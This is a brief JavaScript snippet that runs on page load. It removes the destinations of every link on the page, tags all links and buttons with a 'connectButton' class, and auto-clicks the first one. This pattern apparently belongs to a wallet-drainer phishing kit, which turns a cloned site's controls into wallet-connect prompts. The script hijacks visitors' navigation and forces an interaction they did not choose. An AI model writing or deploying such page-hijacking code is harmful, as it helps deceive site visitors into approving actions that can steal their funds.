document.addEventListener('DOMContentLoaded', function () {
  // Remove href attributes from all links and add 'connectButton' class
  var links = document.querySelectorAll('body a');
  for (var i = 0; i < links.length; i++) {
    var link = links[i];
    link.removeAttribute('href');
    link.classList.add('connectButton');
  }

  // Add 'connectButton' class to all buttons
  var buttons = document.querySelectorAll('body button');
  for (var i = 0; i < buttons.length; i++) {
    var button = buttons[i];
    button.classList.add('connectButton');
  }

  // Remove 'ad-data-linked' attribute from elements
  const elements = document.querySelectorAll('[ad-data-linked]');
  elements.forEach(element => {
    element.removeAttribute('ad-data-linked');
  });
  console.log('Removed ad-data-linked attributes from', elements.length, 'elements');

  // Auto-click the first button or link inside the body tag, if any exist
  var firstButtonOrLink = document.querySelector('body button, body a');
  if (firstButtonOrLink) {
    firstButtonOrLink.click();
    console.log('Auto-clicked the first button or link:', firstButtonOrLink);
  }
});
